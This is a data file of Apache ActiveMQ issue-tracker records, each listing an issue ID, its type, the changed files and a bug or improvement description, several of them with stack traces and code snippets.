According to RFC 3023, "if an XML document is readable by casual users, text/xml is preferable to application/xml. MIME user agents (and web user agents) that do not have explicit support for text/xml will treat it as text/plain, for example, by displaying the XML MIME entity as plain text. Application/xml is preferable when the XML MIME entity is unreadable by casual users".Several other projects supported by Red Hat (Drools, Infinispan, OpenShift) already comply with this RFC.
issueID:AMQ-4857
type:Bug
changed files:WSServlet.java
texts:WSServlet.doWebSocketConnect throws NPE if called with null protocol
I got the NPE shown below while working on a websocket demo.   WebSocketFactory.acceptWebSocket calls WSServlet.doWebSocketConnect with the protocol hard coded to null.java.lang.NullPointerException at org.apache.activemq.transport.ws.WSServlet.doWebSocketConnect(WSServlet.java:54) at org.eclipse.jetty.websocket.WebSocketFactory.acceptWebSocket(WebSocketFactory.java:372) at org.eclipse.jetty.websocket.WebSocketServlet.service(WebSocketServlet.java:104) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1044) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:372) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:978) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116) at org.eclipse.jetty.server.Server.handle(Server.java:367) at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:486) at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:926) at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:988) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:640) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235) at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:628) at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608) at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543) at java.lang.Thread.run(Thread.java:744)
issueID:AMQ-4858
type:Task
changed files:
texts:Scala source file forgotten in /src/main/java
Hi,I noticed a forgotten scala source file in src/main/java. It probably belongs to src/main/javait"s the file activemq-leveldb-store/src/main/java/org/apache/activemq/leveldb/replicated/ReplicatedLevelDBStoreTrait.scala in current trunk
issueID:AMQ-4869
type:Bug
changed files:RemoteJMXBrokerFacade.java
texts:Wrong JMX object name created in RemoteJMXBrokerFacade
When a broker name is given the console code create the wrong broker object name
issueID:AMQ-487
type:Bug
changed files:
texts:Temp Destination definition not sent across network bridge to support request/reply model?
Goal was to test request/response model across a network bridge.  The requestor sets up a temporary topic and includes as the reply topic with message sent to the responder. It is expected that the responder will send message on the provide replyTo topic.Using the multicast://default discovery mechanism and networkConnector transport to interconnect two brokers (different hosts &ldquo;harley&rdquo; to &ldquo;roadrash&rdquo;). Responder client  attaches to &ldquo;harley&rdquo; and requestor client attaches to &ldquo;roadrash&rdquo;. Requestor client creates temporary topic, sends message.Responder receives message attempt to reply on the temporary topic, but errors with message indicating cannot publish to deleted topic
issueID:AMQ-4874
type:Bug
changed files:
texts:DurableSubscriptionOfflineTest.testOrderOnActivateDeactivate fails on CI boxes
This test fails intermittently on CI boxes.  When it fails it sometimes causes the build to hang, and other times just causes no results to be reported from this suite.  I"ll comment the test out for now.It might be a good idea to break this test up into several smaller test suites.  It certainly would make debugging easier.
issueID:AMQ-4876
type:Bug
changed files:
texts:SslContextNBrokerServiceTest fails intermittently on CI boxes
It gets the read timeout shown below when calling socket.startHandshake() as a result of a call to verifyCredentials("dummy"));  I will fix the test by increasing the timeout, but this may be something we want to look at.  I added timing to socket.startHandshake, and it varies from just over a second to over 40 seconds.java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:129) at com.sun.net.ssl.internal.ssl.InputRecord.readFully(InputRecord.java:422) at com.sun.net.ssl.internal.ssl.InputRecord.read(InputRecord.java:460) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:863) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1188) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1215) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1199) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifySslCredentials(SslContextNBrokerServiceTest.java:76) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifyCredentials(SslContextNBrokerServiceTest.java:57) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.testConfigurationIsolation(SslContextNBrokerServiceTest.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
issueID:AMQ-4877
type:Bug
changed files:
texts:QueueMbeanRestartTest fails intermittently
This test fails intermittently, usually on slower boxes.  It will get a stack trace like the one shown below.  The root cause can be seen in the log:2013-11-09 11:04:19,771 &#91;JMX connector  &#93; - WARN  ManagementContext              - Failed to start JMX connector Cannot bind to URL &#91;rmi://localhost:1099/jmxrmi&#93;: javax.naming.NameAlreadyBoundException: jmxrmi &#91;Root exception is java.rmi.AlreadyBoundException: jmxrmi&#93;. Will restart management to re-create JMX connector, trying to remedy this issue.This appears to be the result of a quick server shutdown/restart.  I"ll add a sleep to the test to avoid this.java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:129) at com.sun.net.ssl.internal.ssl.InputRecord.readFully(InputRecord.java:422) at com.sun.net.ssl.internal.ssl.InputRecord.read(InputRecord.java:460) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:863) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1188) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1215) at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1199) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifySslCredentials(SslContextNBrokerServiceTest.java:76) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifyCredentials(SslContextNBrokerServiceTest.java:57) at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.testConfigurationIsolation(SslContextNBrokerServiceTest.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
issueID:AMQ-4881
type:Improvement
changed files:
texts:Align xbean and upgrade to 3.15
We use xbean 3.14 and 3.12 for the maven plugin. We should align these versions and use latest 3.15.
issueID:AMQ-4882
type:Bug
changed files:
texts:LevelDB can get to a corrupt state when using XA transactions
A consumer/producer with failover transport is connected to AMQ and processes messages in XA Transactions. When AMQ is restarted is can happen that LevelDB gets to a corrupt state so that AMQ can not be started anymore without deletind the database.Reproduction: Configure AMQ with LevelDB Run the attached TestClient Restart AMQ several times. At some time it won"t start anymore and produced the exception in the attached log file.
issueID:AMQ-4883
type:Task
changed files:
texts:Fusesource release repo not needed
The proton dependencies are at central.  Thus, the fusesource release repo in the top level pom is no longer needed and can slow down the build (as well as cause extra required configuration if behind a firewall).diff --git a/pom.xml b/pom.xmlindex eb05b07..ffd0bef 100755--- a/pom.xml+++ b/pom.xml@@ -1590,13 +1590,6 @@   </profiles>    <repositories>-    <!-- for the proton dependency -->-    <repository>-      <id>com.fusesource.m2</id>-      <url>http://repo.fusesource.com/nexus/content/groups/public/</url>-      <releases><enabled>true</enabled></releases>-      <snapshots><enabled>false</enabled></snapshots>-    </repository>     <!-- for the paho dependency -->     <repository>       <id>eclipse.m2</id>
issueID:AMQ-4884
type:Bug
changed files:
texts:Wildcard matches do not match
If you subscribe to a Wildcard Destination (e.g. a Topic) - with an name A.*.> then a message sent to a Destination A.B should match that Wildcard and be assigned to that Subscriber. This is not the case currently.
issueID:AMQ-4885
type:Task
changed files:MessageStore.java
TopicMessageStore.java
ProxyTopicMessageStore.java
KahaDBStore.java
Topic.java
LevelDBStore.scala
MemoryTopicMessageStore.java
JDBCTopicMessageStore.java
TempKahaDBStore.java
JournalTopicMessageStore.java
texts:Typos in MessageStore
Thes typos in the "addSubsciption" method and the "memoeyUSage" parameter need to be fixed.
issueID:AMQ-4886
type:Bug
changed files:
texts:AMQ2149LevelDBTest hangs or fails frequently
I"ll update this as I get more information, but this test suite has multiple cases that hang and timeout frequently (testTopicTransactionalOrderWithRestart and testTopicOrderWithRestart seem to do so most frequently.)  It can also hang in tearDown, which causes the whole suite to hang without timing out, which can be a problem when run under Hudson or Jenkins.  I will  attach a stack trace of the tearDown hang, and also update AMQ2149Test to prevent this.  I"m also going to update the test to use JUnit4 and reduce the timeouts from 30 to 5 minutes.
issueID:AMQ-4887
type:Bug
changed files:ActiveMQBytesMessage.java
ActiveMQStreamMessage.java
texts:ActiveMQBytesMessage will lost content if message&#39;s property was set before copy
ActiveMQBytesMessage will lost content if message"s property was set before copy. Here is the test code:Producer:MessageProducer producer;  //initialize Connection, Session, MessageProducer    byte[] bs = "bytes message".getBytes();  BytesMessage message = session.createBytesMessage();  message.writeBytes(bs);  //write bytes to message 1for(int i=0; i< 0; i++){    // then set message"s propery   2    message.setLongProperty("sendTime", System.currentTimeMillis());      try{          producer.send(message);      }catch(){           e.printStackTrace();      }}  Consumer:MessageConsumer consumer  //initailize Connection, Session, MessageConsumer  for(int i=0; i<10; i++){      ActiveMQBytesMessage msg = (ActiveMQBytesMessage)consumer.receive(60*1000);      long sendTime = message.getLongProperty("sendTime");      System.out.println("sendtime:" + sendTime);      ByteSequence bs = message.getMessage().getContent();      System.out.println("bytes data:" + new String(bs.getData()));  }  Expected result:consumer gets bytes data in all received messagesActual result:only the fisrt message has bytes data, all other messages lost bytes data, while long property value is not lost;Analysization:message gets copied when send, it will call storeContent() before copy,  DataOutputStream dataOut will be closed and the data in dataOut will be set to conent. This works correctly if there are no property was set.when setLongProperty was called, it will call setObjectProperty() then will call  initializeWriting(), here DataOutputStream dataOut  will be create AGAIN. So when message was copied in second time, DataOutputStream dataOut is NOT null, but EMPTY, it will clear the value in content.suggestion:restore the content data to DataOutputStream dataOut when nitializeWriting()my fix:ActiveMQBytesMessage : private void  initializeWriting() throws JMSException {669        The original code                ......701                    //fix code            if(this.content !=null && this.content.length >0){                try{                    this.dataOut.write(this.content.getData());                }catch(IOException ioe){                    throw JMSExceptionSupport.create(ioe);                }            }702    }
issueID:AMQ-4889
type:Bug
changed files:NIOSSLTransport.java
texts:ProxyConnector memory usage skyrockets when several ssl handshakes fails
See nabble for further details.To reproduce the issue: Start embedded proxy broker and the AMQ broker that are embedded in AMQTestBroker project (see attachments); Start the AMQTestConsumer project; This program repeatedly tries opening a connection to the ProxyConnector with wrong certificates. Open jconsole to monitor AMQTestBroker memory usage: you should experience an OOM error within one hour with the suggested settings (Xmx = 2048m).Launch configurations and test keystores are attached to this issue along with the java projects.This behavior seems to affect ProxyConnector only, running the test against a standard nio-based TransportConnector does not seem to produce anomalous memory consumptions.
issueID:AMQ-4892
type:Bug
changed files:MQTTInactivityMonitor.java
texts:MQTT clients disconnecting due to socket error do not publish the configured last will and testament message.
None
issueID:AMQ-4893
type:Bug
changed files:
texts:UTF8Buffer should be a valid object for setObjectProperty
If we try to copy headers between messages using getProperties and setObjectProperty with those values it now fails since the UTF8Buffer is not in the whitelist of convertable types. I think it should be added as a whitelisted type that gets handled like a string on setObjectProperty (and probably setStringProperty). Otherwise this causes the application code to have to special case String properties and couple to the hawtbuffer implementation detail.
issueID:AMQ-4896
type:Bug
changed files:MQTTSslTransportFactory.java
TransportConnection.java
MQTTSocket.java
MQTTTransportFilter.java
MQTTProtocolConverter.java
PersistenceAdapterSupport.java
MQTTNIOTransportFactory.java
MQTTTransportFactory.java
texts:MQTT does not properly restore durable subs with the Paho client.
None
issueID:AMQ-4897
type:Bug
changed files:
texts:Race condition in failover transport
There"s a small chance of the race condition when using priority backup with extremely small reconnect delay (0). In that case, the failover transport will get into inconsistent state. The client will stay connected to the "non-priority" broker, but the priority backup will not be created due to this inconsistency.The solution is to synchronise handling of connection failure with the reconnect mutex.
issueID:AMQ-4899
type:Bug
changed files:
texts:Multiple consumers of the same virtual topic queue cannot have different message selectors
If two consumers of the same virtual topic queue have different message selectors, only one selector gets cached via the SubQueueSelectorCacheBroker.java. The problem is when the consumers are offline. Because the cache only caches one selector, the broker will only allow messages that "pass" the cached selector to be put in the queue. All other messages that may be intended for the other consumer will be lost. The fix would allow multiple selectors to be cached per Virtual Topic Consumer queue vs. one.
issueID:AMQ-4900
type:Bug
changed files:
texts:With AMQP transport, Delivery Annotations are stored with the message
If a message that has Delivery Annotations is transferred to a queue in the broker, the content of the annotations is stored and appended to the message when sent to a consumer.I"m not 100% certain, but I believe that annotations should not be stored with the message in a queue.
issueID:AMQ-4903
type:Improvement
changed files:
texts:ActiveMQ should depend to http feature instead of jetty
Karaf 3.x won"t provide directly the jetty feature anymore (it now leverages the pax-web features directly, so jetty feature will actually be pax-jetty).In order to support Karaf 3, ActiveMQ should use the http feature instead of jetty feature.
issueID:AMQ-4904
type:Bug
changed files:
texts:jdbc ioexception handler can restart transports in error after lease expriy
When the db is unavailable the jdbcioexception handler will suspend by stopping the transport connectors and will await a successful checkpoint on the jdbc store before a restart.If the db becomes available btween the check for lock and the checkpoint, it is possible to try and restart the transports without the lock, in error.We need to validate the lock after we stop our wait for the checkpoint.
issueID:AMQ-4905
type:Bug
changed files:pom.xml
RuntimeConfigurationBroker.java
texts:runtime config - embed spring beans schema to avoid trip to the internet in osgi land
to validate the xml at runtime using jaxb, the schema needs to be provided to the jaxbcontext but spring schema resolution through spring.schemas does not work. Simplest approach is to embed the dependent schemas and pull them from the containing jar via getResourceThis avoids a roundtrip to the net at runtime.
issueID:AMQ-4906
type:Bug
changed files:
texts:advisory producerCount = 0 is not received on temporary queue
i notice i never receive producer advisory messages (ActiveMQ.Advisory.Producer.Queue .&#91;...&#93;) with producerCount=0 when the client message producers on temporary queue are closed. i do receive producerCount > 0. However, the consumerCount (from ActiveMQ.Advisory.Consumer.Queue.&#91;...&#93;) appears to work as expected.From looking into org.apache.activemq.advisory.AdvisoryBroker.java@Override    public void removeProducer(ConnectionContext context, ProducerInfo info) throws Exception {        super.removeProducer(context, info);        // Don"t advise advisory topics.        ActiveMQDestination dest = info.getDestination();        if (info.getDestination() != null && !AdvisorySupport.isAdvisoryTopic(dest)) {            ActiveMQTopic topic = AdvisorySupport.getProducerAdvisoryTopic(dest);            producers.remove(info.getProducerId());            if (!dest.isTemporary() || destinations.contains(dest)) { // PLEASE NOTE: <== could this actually be destinations.containsKey(dest)                fireProducerAdvisory(context, dest,topic, info.createRemoveCommand());            }        }    }as reference, the "working" removeConsumer method:@Override    public void removeConsumer(ConnectionContext context, ConsumerInfo info) throws Exception {        super.removeConsumer(context, info);        // Don"t advise advisory topics.        ActiveMQDestination dest = info.getDestination();        if (!AdvisorySupport.isAdvisoryTopic(dest)) {            ActiveMQTopic topic = AdvisorySupport.getConsumerAdvisoryTopic(dest);            consumers.remove(info);            if (!dest.isTemporary() || destinations.containsKey(dest)) {                fireConsumerAdvisory(context,dest, topic, info.createRemoveCommand());            }        }    }Please note the destinations.containsKey(dest) vs destinations.contains(dest) (for concurrentHashMaps this is identical to containsValue()). I"m assuming the logic is to make sure the producer destination do exist in both casesI tested this with 5.7.0. the code is similar in 5.9.0
issueID:AMQ-4907
type:Bug
changed files:
texts:kahadb - do some sanity check on the index when checkForCorruptJournalFiles
When the index is corrupt all bets are off and we need to replay the journal to rebuild the index. We do this automatically on a failure to load the index. When the index loads and is still corrupt, we can resume and messages are unavailable.Adding some sanity checking to the index, when checkForCorruptJournalFiles is enabled (paranoid mode)  will allow us to detect corruption and force an auto recreation.
issueID:AMQ-4909
type:Improvement
changed files:
texts:OSGi granularity of activemq-osgi bundle
Installing any AMQ feature, whether activemq-client, activemq-broker or activemq-camel, ends up installing the activemq-osgi bundle which is a one-stop-shop include-all bundle for AMQ.In other words, if you install activemq-client you end up with a fully fledged broker. If you install activemq-camel, you also end up with a fully fledged broker.Moreover, the AMQ Camel component is part of the activemq-osgi bundle, which means that you can no longer upgrade only the AMQ broker if you"re running in a setup with Camel, because it drags along an updated Camel AMQ component which may require newer Camel APIs. At least it"s not possible via Karaf features. A workaround may be to fall back to installing individual AMQ bundles.More info here: http://activemq.2283324.n4.nabble.com/Upgrading-only-AMQ-broker-in-OSGi-container-with-Camel-tp4674930.html.
issueID:AMQ-4910
type:Bug
changed files:
texts:Windows batch script doesn&#39;t like spaces in installation path
If you unzip the binary distribution to "C:Program Filesapache-active-mq-5.9.0" or any directory that contains a space in it, the binactivemq.bat file fails to start. With the error message:Error: Could not find or load main class Filesapache-activemq-5.9.0in..conflogin.configWork-around - either unzip to a directory with no spaces, or set the ACTIVEMQ_HOME environment variable to the short version of the path, e.g. set ACTIVEMQ_HOME=c:Progra~1apache-activemq-5.9.0
issueID:AMQ-4912
type:Improvement
changed files:StatisticsBroker.java
texts:StatisticsPlugin - destination stats should include broker info
When receiving destination stats, such as{memoryUsage=0, dequeueCount=2, inflightCount=0, messagesCached=0, averageEnqueueTime=7.5, destinationName=queue://broker.stats, size=0, memoryPercentUsage=0, producerCount=0, consumerCount=2, minEnqueueTime=0.0, maxEnqueueTime=15.0, dispatchCount=2, expiredCount=0, enqueueCount=2, memoryLimit=67108864}it should include broker information as well. For example: brokerName= and brokerId=
issueID:AMQ-4914
type:Bug
changed files:
texts:AMQP consumer hangs when receiving large messages
The AMQP client hangs when trying to receive messages > 32k.  I will add a test that reproduces this.
issueID:AMQ-4916
type:Improvement
changed files:
texts:Add JMX stats for Consumers and Producers accessible from the Broker
None
issueID:AMQ-4917
type:Bug
changed files:
texts:LevelDB store can fail when using durable subs
Tenzin giatso  original reported this issue in AMQ-4837 :The broker stopped 3 times this night after about 6h50min, then 6h50 min then 50min.The error sounds to be the saùme (except the line number in class) but the broker restart automaticly with the snapshot.2013-11-19 05:27:43,671 | INFO | Stopping BrokerService&#91;localhost&#93; due to exception, java.io.IOException | org.apache.activemq.util.DefaultIOExceptionHandler | LevelDB IOException handler.java.io.IOExceptionat org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:554)at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:1021)at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1320)at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1244)at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recover(LevelDBStore.scala:747)at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:588)at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65)at org.apache.activemq.broker.region.Topic$6.run(Topic.java:721)at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)at java.util.TimerThread.mainLoop(Unknown Source)at java.util.TimerThread.run(Unknown Source)Caused by: java.lang.NullPointerExceptionat org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1248)It"s not easy to reproduce. It"s better with the snapshot but i can"t say that no messages are lost with leveldb.
issueID:AMQ-4918
type:New Feature
changed files:DemandForwardingBridgeSupport.java
MBeanNetworkListener.java
MBeanBridgeDestination.java
NetworkDestinationView.java
NetworkDestinationViewMBean.java
BrokerMBeanSupport.java
NetworkBridgeListener.java
SizeStatisticImpl.java
texts:Added JMX metics for networks per destination
None
issueID:AMQ-4920
type:Bug
changed files:AmqpProtocolConverter.java
texts:AmqpErrorException occurs with multiple concurrent amqp topic consumers
I"ll add a test to reproduce this.  There are currently 2 problems.  The more frequent one looks like:  org.apache.qpid.amqp_1_0.type.AmqpErrorException        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:99)        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)… repeated many timesat org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)        at org.apache.qpid.amqp_1_0.messaging.SectionDecoderImpl.parseAll(SectionDecoderImpl.java:49)        at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:280)        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:286)        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:255)        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:238)        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:56)        at org.apache.activemq.transport.amqp.ENTMQ466ConsumerThread.run(ENTMQ466Test.java:123)This occurs at the line "final EncodedMessage amqp = outboundTransformer.transform(jms);" in the ConsumerContext.pumpOutbound() method of AmqpProtocolConverter(). This call sometimes returns with its content (amqp.getArray()) set to all zeros. On those messages this lineLOG.info("In pumpOutbound, setting currentBuffer to offset {} length {} content &#91;{}&#93;", amqp.getArrayOffset(), amqp.getLength(), amqp.getArray());returns:2013-11-26 17:19:16,680 &#91;calhost&#93; Task-3] - INFO AmqpProtocolConverter - In pumpOutbound, setting currentBuffer to offset 0 length 162 content [[0, 0, 0, 0, 0,  , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]At the root of this, outboundTransformer is a (proton) AutoOutboundTransformer.  It calls AMQPNativeOutboundTransformer.transform(), which calls msg.readBytes(data), which sometimes writes all 0s to data.  Here msg is an ActiveMQBytesMessage.
issueID:AMQ-4923
type:Bug
changed files:
texts:Replicated LevelDB: Loss of broker Quorum fails to fully stop the master
Master keeps reporting:INFO | The connection to "tcp://10.64.132.143:55732" is taking a long time to shutdown.
issueID:AMQ-4924
type:Bug
changed files:
texts:Duplicate messages are left in the persistence store
We have a local and remote broker connected with a duplex bridge, which is initiated by the remote broker.Producers are attached to the remote broker, one consumer to the local broker.The following scenario causes messages to be left in the local store, which are replayed when the local broker is restarted: messages are forwarded from the remote broker to the local broker messages are dispatched to the local consumer the connection between the local and remote broker fails the local broker tries to acknowledge the message reception to the remote broker, which fails the remote broker reconnects the messages are resent the local broker correctly identifies them as duplicates, but puts them into the store nevertheless where they remain until the local broker is restarted other messages are produced and consumed without a problem the local broker is restarted the duplicates are now delivered to the local consumer again and of course out of orderThis behaviour can be identified by a queue size which does not seem to shrink below a certain number, even if a consumer is connected and consuming other messages.When the log level is set to TRACE these messages indicate the problem:2013-12-06 20:35:17,405 TRACE .a.a.b.r.c.AbstractStoreCursor - org.apache.activemq.broker.region.cursors.QueueStorePrefetch@c0bc4f:testqueue,batchResetNeeded=false,storeHasMessages=true,size=0,cacheEnabled=true,maxBatchSize:1 - cursor got duplicate: ID:smcexp5-58011-1386358514283-7:1:1:1:1, 4 [ActiveMQ VMTransport: vm://LOCAL#19-1]2013-12-06 20:35:17,412 TRACE .a.a.b.r.c.AbstractStoreCursor - org.apache.activemq.broker.region.cursors.QueueStorePrefetch@c0bc4f:testqueue,batchResetNeeded=false,storeHasMessages=false,size=1,cacheEnabled=false,maxBatchSize:1 - fillBatch [ActiveMQ BrokerService[LOCAL] Task-2]
issueID:AMQ-4926
type:Improvement
changed files:
texts:Extends activemq-karaf import version range to work with both Karaf 2 & 3
In order to support both Karaf 2.x and 3.x, activemq-karaf bundle should extends the import version range.
issueID:AMQ-4927
type:Bug
changed files:
texts:clients can not receive mqtt retained message
I use activemq 5.9.0 as mqtt server, and eclipse paho as the mqtt client package. But the client can not receive the retained message. If I use Apollo, it works fine.Is it a bug? or I miss some configuration?Someone else have the same problem, the discussion is here: http://activemq.2283324.n4.nabble.com/Retained-Flag-in-MQTT-td4668333.html
issueID:AMQ-4929
type:Bug
changed files:TransactionBroker.java
texts:remove old and unused org.apache.activemq.broker.BrokerService#setSupportFailOver
there is a bunch of duplicate detection in transactionbroker that is disabled by default and not tested that duplicates work done elsewhere - store and producerAutit. It should be removed.
issueID:AMQ-4930
type:Bug
changed files:Queue.java
texts:java.lang.OutOfMemoryError: Java heap space Exception when sending big amount(1000+) of 1M non persistent messages to broker
missing reference count on filepending message cursor allows unlimited messages to be loaded into the broker.The periodic messageExpiry task does a forced page in, that does not seem to respect a memory limit, even if it is correctly calculated.disabling message expiry avoids the issue.org.apache.activemq.broker.region.policy.PolicyEntry#expireMessagesPeriod=0
issueID:AMQ-4931
type:Improvement
changed files:
texts:Karaf commands should auto-export interfaces
